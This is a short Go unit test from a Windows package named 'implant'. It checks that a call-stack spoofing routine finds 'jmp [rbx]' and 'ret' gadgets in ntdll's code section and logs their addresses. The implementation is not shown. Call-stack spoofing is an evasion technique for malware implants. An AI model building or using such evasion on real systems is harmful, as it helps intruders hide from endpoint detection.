//go:build windows && amd64

package implant

import "testing"

func TestFindStackSpoofGadgets(t *testing.T) {
	SpoofCallStack()
	if spoofJmpRbx == 0 {
		t.Fatal("jmp [rbx] gadget not found in ntdll .text")
	}
	if spoofRet == 0 {
		t.Fatal("ret gadget not found in ntdll .text")
	}
	t.Logf("jmp [rbx] gadget = 0x%x, ret gadget = 0x%x", spoofJmpRbx, spoofRet)
}
